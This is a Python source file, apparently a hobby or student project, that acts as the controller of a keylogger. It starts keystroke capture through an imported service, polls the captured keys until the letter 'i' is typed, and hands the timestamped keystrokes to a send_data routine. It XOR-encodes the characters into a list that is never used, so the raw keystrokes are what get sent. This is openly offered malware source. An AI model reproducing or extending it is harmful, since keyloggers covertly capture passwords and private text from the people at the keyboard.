import datetime
import time
from KeyloggerService import service
from Encryption_file import encryptor
from FileWriter import file_writer
class KeyLoggerManager:
    def __init__(self):
        self.buffer = []
        self.to_encrypt = []


    def manager(self):
        end = False
        service.start_logging()

        while not end:
            self.buffer = service.get_logged_keys()
            if "i" in self.buffer:
                end = True
            time.sleep(5)

        service.stop_logging()
        print(self.buffer)
        content = {str(datetime.datetime.now()):self.buffer}
        for char in self.buffer:
            self.to_encrypt.append(encryptor.ascii_xor(char))
        file_writer.send_data(content,"15:02:45")

a= KeyLoggerManager()
a.manager()



